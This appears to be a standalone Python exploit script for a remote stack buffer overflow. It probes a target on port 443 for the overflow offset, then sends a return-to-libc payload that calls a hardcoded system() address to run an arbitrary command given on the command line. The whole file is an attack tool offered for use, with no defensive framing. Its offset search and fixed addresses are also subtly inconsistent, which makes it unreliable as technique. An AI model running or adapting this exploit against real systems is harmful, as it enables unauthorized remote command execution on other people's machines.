import socket
import struct
import sys
import time

# Function to find the correct stack offset
def find_offset(target_ip, port, start_offset=0, end_offset=2000):
    for offset in range(start_offset, end_offset):
        payload = b"A" * offset  # Fill the buffer up to the offset
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            sock.send(payload)
            response = sock.recv(1024)
            sock.close()
            if b"Welcome" in response:  # Replace with specific response after crash
                print(f"[*] Found the correct offset: {offset}")
                return offset
        except Exception as e:
            continue
    print("[!] Failed to find the correct offset")
    sys.exit(1)

# Function to create the exploit payload
def create_exploit_payload(command, offset, system_address=0x0804a360, command_address=0x0804b008):
    payload = b"A" * offset  # Fill the buffer up to the correct offset
    payload += struct.pack("<I", system_address)  # Overwrite return address with system()
    payload += b"BBBB"  # Fake return address
    payload += struct.pack("<I", command_address)  # Address of the command
    payload += command.encode()  # Command to execute
    return payload

# Function to send the exploit payload to the target
def send_payload(target_ip, port, payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        sock.close()
        print(f"[+] Exploit sent. Response: {response.decode(errors='replace')}")
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")

# Function to execute the full exploit
def exploit_vulnerability(target_ip, port, command):
    print("[*] Finding buffer overflow offset...")
    offset = find_offset(target_ip, port)  # Find correct buffer overflow offset
    print("[*] Creating exploit payload...")
    payload = create_exploit_payload(command, offset)
    print("[*] Sending exploit payload...")
    send_payload(target_ip, port, payload)

# Main function to execute the entire exploit
def main():
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_ip> <command>")
        sys.exit(1)

    target_ip = sys.argv[1]
    command = sys.argv[2]
    port = 443  # Modify with the appropriate port if needed

    print("[*] Starting exploit...")
    exploit_vulnerability(target_ip, port, command)

if __name__ == "__main__":
    main()
